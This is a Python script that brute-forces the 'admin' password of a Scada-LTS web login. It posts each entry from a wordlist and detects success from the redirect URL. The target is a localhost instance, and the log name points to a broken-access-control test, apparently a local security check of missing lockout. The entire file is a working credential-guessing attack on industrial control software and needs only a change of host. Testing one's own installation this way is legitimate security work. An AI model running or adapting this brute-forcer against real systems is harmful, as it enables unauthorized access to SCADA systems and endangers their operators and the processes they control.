import requests
import logging
from datetime import datetime

HOST = "http://127.0.0.1:8080"
URL_ERROR = f"{HOST}/Scada-LTS/login.htm?error"
SUCCESS_LOCATION = f"{HOST}/Scada-LTS/watch_list.shtm"

#Creating reusable session so we can make sure that windows errors do not occur frequently
session = requests.Session()

logging.basicConfig(
    filename="01-broken-access-control.log",
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)


def sendLoginRequest(password: str): 
    form_data = {
        'username': 'admin',
        'password': password,
    }
    try:
        res = session.post(f"{HOST}/Scada-LTS/login.htm", data=form_data, timeout=3)

        return res
    except Exception as e:
        logging.error(f'[FAILURE] Request failed with password {password}. Error: {e}')
        print(f"[ERROR] Unexpected error {e}")

        return None
        
def tryPassword(password: str):
    res = sendLoginRequest(password=password)

    if res is None:
        print('[FAILURE] Password failure')

        return False

    if res.url == URL_ERROR:
        print('[ERROR] Incorrect password')

        return False

    if res.url == SUCCESS_LOCATION:
        print('[SUCCESS] Correct password!')

        return True
    
    return False
    
def tryPasswords():
    start_time = datetime.now()
    with open("password-wordlist.txt") as f:
        tries = 0

        for password in f:
            tries += 1
            stripped_pass = password.strip()

            print(f'[TRYING PASSWORD] {stripped_pass}')
            result = tryPassword(password=stripped_pass)

            if result:
                end_time = datetime.now()
                print(f'Password found: {stripped_pass} | Number of tries: {tries}')
                logging.info(f'[INFO]Request succeded with password {stripped_pass}. Tries: {tries}')
                print(f'[FOUND AT] {end_time.strftime('%Y-%m-%d %H:%M:%S')}')
                print(f'[DURATION] {end_time-start_time}')
                logging.info(f"Duration of found {end_time-start_time}")


                break
    


def main():
    tryPasswords()

if __name__ == '__main__':
    main() 
    